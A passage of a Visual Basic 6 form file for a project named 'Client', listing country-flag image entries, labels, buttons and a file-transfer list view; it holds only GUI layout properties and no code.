            BeginProperty ListImage85 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1643
               Key             =   "gl"
            EndProperty
            BeginProperty ListImage86 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B17CF
               Key             =   "gm"
            EndProperty
            BeginProperty ListImage87 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1955
               Key             =   "gn"
            EndProperty
            BeginProperty ListImage88 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1ADC
               Key             =   "gp"
            EndProperty
            BeginProperty ListImage89 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1C5D
               Key             =   "gq"
            EndProperty
            BeginProperty ListImage90 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1DE2
               Key             =   "gr"
            EndProperty
            BeginProperty ListImage91 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B1F6E
               Key             =   "gs"
            EndProperty
            BeginProperty ListImage92 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B20F5
               Key             =   "gt"
            EndProperty
            BeginProperty ListImage93 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2287
               Key             =   "gu"
            EndProperty
            BeginProperty ListImage94 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2415
               Key             =   "gw"
            EndProperty
            BeginProperty ListImage95 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2597
               Key             =   "gy"
            EndProperty
            BeginProperty ListImage96 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2722
               Key             =   "hk"
            EndProperty
            BeginProperty ListImage97 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B28B3
               Key             =   "hm"
            EndProperty
            BeginProperty ListImage98 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2A49
               Key             =   "hn"
            EndProperty
            BeginProperty ListImage99 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2BD4
               Key             =   "hr"
            EndProperty
            BeginProperty ListImage100 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2D5C
               Key             =   "ht"
            EndProperty
            BeginProperty ListImage101 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B2EE1
               Key             =   "hu"
            EndProperty
            BeginProperty ListImage102 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3062
               Key             =   "id"
            EndProperty
            BeginProperty ListImage103 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B31E8
               Key             =   "ie"
            EndProperty
            BeginProperty ListImage104 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3377
               Key             =   "il"
            EndProperty
            BeginProperty ListImage105 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3501
               Key             =   "in"
            EndProperty
            BeginProperty ListImage106 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3688
               Key             =   "io"
            EndProperty
            BeginProperty ListImage107 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3819
               Key             =   "iq"
            EndProperty
            BeginProperty ListImage108 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B399E
               Key             =   "ir"
            EndProperty
            BeginProperty ListImage109 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3B28
               Key             =   "is"
            EndProperty
            BeginProperty ListImage110 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3CB9
               Key             =   "it"
            EndProperty
            BeginProperty ListImage111 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3E43
               Key             =   "jm"
            EndProperty
            BeginProperty ListImage112 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B3FCC
               Key             =   "jo"
            EndProperty
            BeginProperty ListImage113 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B4150
               Key             =   "jp"
            EndProperty
            BeginProperty ListImage114 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B42DA
               Key             =   "ke"
            EndProperty
            BeginProperty ListImage115 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B445E
               Key             =   "kg"
            EndProperty
            BeginProperty ListImage116 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B45EF
               Key             =   "kh"
            EndProperty
            BeginProperty ListImage117 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B477A
               Key             =   "ki"
            EndProperty
            BeginProperty ListImage118 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B4909
               Key             =   "km"
            EndProperty
            BeginProperty ListImage119 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B4A8B
               Key             =   "kn"
            EndProperty
            BeginProperty ListImage120 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B4C19
               Key             =   "kp"
            EndProperty
            BeginProperty ListImage121 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B4DA3
               Key             =   "kr"
            EndProperty
            BeginProperty ListImage122 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B4F40
               Key             =   "kw"
            EndProperty
            BeginProperty ListImage123 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B50C6
               Key             =   "ky"
            EndProperty
            BeginProperty ListImage124 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B5257
               Key             =   "kz"
            EndProperty
            BeginProperty ListImage125 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B53E9
               Key             =   "la"
            EndProperty
            BeginProperty ListImage126 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B5573
               Key             =   "lb"
            EndProperty
            BeginProperty ListImage127 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B56FD
               Key             =   "lc"
            EndProperty
            BeginProperty ListImage128 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B581C
               Key             =   "li"
            EndProperty
            BeginProperty ListImage129 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B599F
               Key             =   "lk"
            EndProperty
            BeginProperty ListImage130 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B5B34
               Key             =   "lr"
            EndProperty
            BeginProperty ListImage131 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B5CB8
               Key             =   "ls"
            EndProperty
            BeginProperty ListImage132 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B5E45
               Key             =   "lt"
            EndProperty
            BeginProperty ListImage133 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B5FCB
               Key             =   "lu"
            EndProperty
            BeginProperty ListImage134 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B6157
               Key             =   "lv"
            EndProperty
            BeginProperty ListImage135 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B62DE
               Key             =   "ly"
            EndProperty
            BeginProperty ListImage136 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B6464
               Key             =   "ma"
            EndProperty
            BeginProperty ListImage137 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B65EF
               Key             =   "mc"
            EndProperty
            BeginProperty ListImage138 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B6772
               Key             =   "md"
            EndProperty
            BeginProperty ListImage139 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B68FD
               Key             =   "me"
            EndProperty
            BeginProperty ListImage140 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B6A07
               Key             =   "mg"
            EndProperty
            BeginProperty ListImage141 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B6B97
               Key             =   "mh"
            EndProperty
            BeginProperty ListImage142 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B6D25
               Key             =   "mk"
            EndProperty
            BeginProperty ListImage143 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B6EBF
               Key             =   "ml"
            EndProperty
            BeginProperty ListImage144 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B7046
               Key             =   "mm"
            EndProperty
            BeginProperty ListImage145 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B71CF
               Key             =   "mn"
            EndProperty
            BeginProperty ListImage146 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B735B
               Key             =   "mo"
            EndProperty
            BeginProperty ListImage147 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B74F1
               Key             =   "mp"
            EndProperty
            BeginProperty ListImage148 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B767D
               Key             =   "mq"
            EndProperty
            BeginProperty ListImage149 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B7814
               Key             =   "mr"
            EndProperty
            BeginProperty ListImage150 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B79A9
               Key             =   "ms"
            EndProperty
            BeginProperty ListImage151 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B7B38
               Key             =   "mt"
            EndProperty
            BeginProperty ListImage152 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B7CC5
               Key             =   "mu"
            EndProperty
            BeginProperty ListImage153 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B7E47
               Key             =   "mv"
            EndProperty
            BeginProperty ListImage154 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B7FD7
               Key             =   "mw"
            EndProperty
            BeginProperty ListImage155 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B815F
               Key             =   "mx"
            EndProperty
            BeginProperty ListImage156 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B82E9
               Key             =   "my"
            EndProperty
            BeginProperty ListImage157 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B847C
               Key             =   "mz"
            EndProperty
            BeginProperty ListImage158 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B8606
               Key             =   "na"
            EndProperty
            BeginProperty ListImage159 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B8795
               Key             =   "nc"
            EndProperty
            BeginProperty ListImage160 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B891D
               Key             =   "ne"
            EndProperty
            BeginProperty ListImage161 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B8AA7
               Key             =   "nf"
            EndProperty
            BeginProperty ListImage162 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B8C3A
               Key             =   "ng"
            EndProperty
            BeginProperty ListImage163 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B8DC9
               Key             =   "ni"
            EndProperty
            BeginProperty ListImage164 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B8F53
               Key             =   "nl"
            EndProperty
            BeginProperty ListImage165 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B90D7
               Key             =   "no"
            EndProperty
            BeginProperty ListImage166 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B926B
               Key             =   "np"
            EndProperty
            BeginProperty ListImage167 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B93B5
               Key             =   "nr"
            EndProperty
            BeginProperty ListImage168 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B953D
               Key             =   "nu"
            EndProperty
            BeginProperty ListImage169 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B96CA
               Key             =   "nz"
            EndProperty
            BeginProperty ListImage170 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B9857
               Key             =   "om"
            EndProperty
            BeginProperty ListImage171 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B99DF
               Key             =   "pa"
            EndProperty
            BeginProperty ListImage172 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B9B6A
               Key             =   "pe"
            EndProperty
            BeginProperty ListImage173 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B9CEF
               Key             =   "pf"
            EndProperty
            BeginProperty ListImage174 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B9E79
               Key             =   "pg"
            EndProperty
            BeginProperty ListImage175 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":B9FFD
               Key             =   "ph"
            EndProperty
            BeginProperty ListImage176 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BA182
               Key             =   "pk"
            EndProperty
            BeginProperty ListImage177 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BA317
               Key             =   "pl"
            EndProperty
            BeginProperty ListImage178 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BA49B
               Key             =   "pm"
            EndProperty
            BeginProperty ListImage179 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BA62D
               Key             =   "pn"
            EndProperty
            BeginProperty ListImage180 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BA7B8
               Key             =   "pr"
            EndProperty
            BeginProperty ListImage181 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BA945
               Key             =   "ps"
            EndProperty
            BeginProperty ListImage182 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BAAC7
               Key             =   "pt"
            EndProperty
            BeginProperty ListImage183 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BAC54
               Key             =   "pw"
            EndProperty
            BeginProperty ListImage184 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BADE6
               Key             =   "py"
            EndProperty
            BeginProperty ListImage185 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BAF6D
               Key             =   "qa"
            EndProperty
            BeginProperty ListImage186 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BB0F5
               Key             =   "re"
            EndProperty
            BeginProperty ListImage187 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BB27F
               Key             =   "ro"
            EndProperty
            BeginProperty ListImage188 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BB406
               Key             =   "rs"
            EndProperty
            BeginProperty ListImage189 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BB510
               Key             =   "ru"
            EndProperty
            BeginProperty ListImage190 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BB695
               Key             =   "rw"
            EndProperty
            BeginProperty ListImage191 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BB81A
               Key             =   "sa"
            EndProperty
            BeginProperty ListImage192 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BB9A8
               Key             =   "sb"
            EndProperty
            BeginProperty ListImage193 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BBB32
               Key             =   "sc"
            EndProperty
            BeginProperty ListImage194 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BBCB3
               Key             =   "scotland"
            EndProperty
            BeginProperty ListImage195 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BBE49
               Key             =   "sd"
            EndProperty
            BeginProperty ListImage196 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BBFC8
               Key             =   "se"
            EndProperty
            BeginProperty ListImage197 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BC153
               Key             =   "sg"
            EndProperty
            BeginProperty ListImage198 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BC2DB
               Key             =   "sh"
            EndProperty
            BeginProperty ListImage199 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BC46A
               Key             =   "si"
            EndProperty
            BeginProperty ListImage200 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BC5F0
               Key             =   "sj"
            EndProperty
            BeginProperty ListImage201 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BC784
               Key             =   "sk"
            EndProperty
            BeginProperty ListImage202 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BC909
               Key             =   "sl"
            EndProperty
            BeginProperty ListImage203 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BCA90
               Key             =   "sm"
            EndProperty
            BeginProperty ListImage204 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BCC1B
               Key             =   "sn"
            EndProperty
            BeginProperty ListImage205 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BCDA3
               Key             =   "so"
            EndProperty
            BeginProperty ListImage206 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BCF37
               Key             =   "sr"
            EndProperty
            BeginProperty ListImage207 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BD0BC
               Key             =   "st"
            EndProperty
            BeginProperty ListImage208 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BD247
               Key             =   "sv"
            EndProperty
            BeginProperty ListImage209 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BD3CE
               Key             =   "sy"
            EndProperty
            BeginProperty ListImage210 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BD553
               Key             =   "sz"
            EndProperty
            BeginProperty ListImage211 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BD6DA
               Key             =   "tc"
            EndProperty
            BeginProperty ListImage212 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BD864
               Key             =   "td"
            EndProperty
            BeginProperty ListImage213 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BD9F0
               Key             =   "tf"
            EndProperty
            BeginProperty ListImage214 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BDB79
               Key             =   "tg"
            EndProperty
            BeginProperty ListImage215 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BDD03
               Key             =   "th"
            EndProperty
            BeginProperty ListImage216 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BDE87
               Key             =   "tj"
            EndProperty
            BeginProperty ListImage217 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BE00C
               Key             =   "tk"
            EndProperty
            BeginProperty ListImage218 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BE19C
               Key             =   "tl"
            EndProperty
            BeginProperty ListImage219 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BE320
               Key             =   "tm"
            EndProperty
            BeginProperty ListImage220 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BE4AB
               Key             =   "tn"
            EndProperty
            BeginProperty ListImage221 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BE63E
               Key             =   "to"
            EndProperty
            BeginProperty ListImage222 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BE7C9
               Key             =   "tr"
            EndProperty
            BeginProperty ListImage223 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BE958
               Key             =   "tt"
            EndProperty
            BeginProperty ListImage224 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BEAED
               Key             =   "tv"
            EndProperty
            BeginProperty ListImage225 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BEC72
               Key             =   "tw"
            EndProperty
            BeginProperty ListImage226 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BEDFD
               Key             =   "tz"
            EndProperty
            BeginProperty ListImage227 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BEF87
               Key             =   "ua"
            EndProperty
            BeginProperty ListImage228 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BF10B
               Key             =   "ug"
            EndProperty
            BeginProperty ListImage229 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BF28E
               Key             =   "um"
            EndProperty
            BeginProperty ListImage230 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BF41D
               Key             =   "us"
            EndProperty
            BeginProperty ListImage231 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BF5A8
               Key             =   "uy"
            EndProperty
            BeginProperty ListImage232 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BF739
               Key             =   "uz"
            EndProperty
            BeginProperty ListImage233 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BF8C1
               Key             =   "va"
            EndProperty
            BeginProperty ListImage234 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BFA4E
               Key             =   "vc"
            EndProperty
            BeginProperty ListImage235 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BFBDC
               Key             =   "ve"
            EndProperty
            BeginProperty ListImage236 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BFD64
               Key             =   "vg"
            EndProperty
            BeginProperty ListImage237 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":BFEF0
               Key             =   "vi"
            EndProperty
            BeginProperty ListImage238 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C0084
               Key             =   "vn"
            EndProperty
            BeginProperty ListImage239 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C0212
               Key             =   "vu"
            EndProperty
            BeginProperty ListImage240 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C039B
               Key             =   "wales"
            EndProperty
            BeginProperty ListImage241 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C052B
               Key             =   "wf"
            EndProperty
            BeginProperty ListImage242 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C06C0
               Key             =   "ws"
            EndProperty
            BeginProperty ListImage243 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C0849
               Key             =   "ye"
            EndProperty
            BeginProperty ListImage244 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C09C9
               Key             =   "yt"
            EndProperty
            BeginProperty ListImage245 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C0B63
               Key             =   "za"
            EndProperty
            BeginProperty ListImage246 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C0CEA
               Key             =   "zm"
            EndProperty
            BeginProperty ListImage247 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":C0E6C
               Key             =   "zw"
            EndProperty
         EndProperty
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "Trebuchet MS"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   270
         Index           =   75
         Left            =   120
         TabIndex        =   376
         Top             =   4800
         Width           =   60
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         Caption         =   "MADE IN TURKEY"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000080&
         Height          =   270
         Index           =   57
         Left            =   4320
         TabIndex        =   316
         Top             =   4800
         Width           =   2145
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000080&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   300
         Index           =   52
         Left            =   5160
         TabIndex        =   302
         Top             =   0
         Width           =   1620
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         Caption         =   "Program Coded By Who!"
         BeginProperty Font 
            Name            =   "Trebuchet MS"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   270
         Index           =   47
         Left            =   4320
         TabIndex        =   298
         Top             =   4560
         Width           =   2145
      End
   End
   Begin Client.cmd cikis 
      Height          =   300
      Left            =   9600
      TabIndex        =   244
      Top             =   0
      Width           =   255
      _ExtentX        =   450
      _ExtentY        =   529
      BTYPE           =   8
      TX              =   "X"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   0
      BCOLO           =   0
      FCOL            =   16777215
      FCOLO           =   16777215
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "Form1.frx":C0FF5
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin Client.cmd simgedurumu 
      Height          =   300
      Left            =   9360
      TabIndex        =   245
      Top             =   0
      Width           =   255
      _ExtentX        =   450
      _ExtentY        =   529
      BTYPE           =   8
      TX              =   "_"
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   0
      BCOLO           =   0
      FCOL            =   16777215
      FCOLO           =   16777215
      MCOL            =   12632256
      MPTR            =   99
      MICON           =   "Form1.frx":C130F
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   -1  'True
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin MSComctlLib.ListView lvwtransfer 
      Height          =   1215
      Left            =   2760
      TabIndex        =   247
      Top             =   5640
      Width           =   6735
      _ExtentX        =   11880
      _ExtentY        =   2143
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "imlist"
      SmallIcons      =   "imlist"
      ColHdrIcons     =   "imlist"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
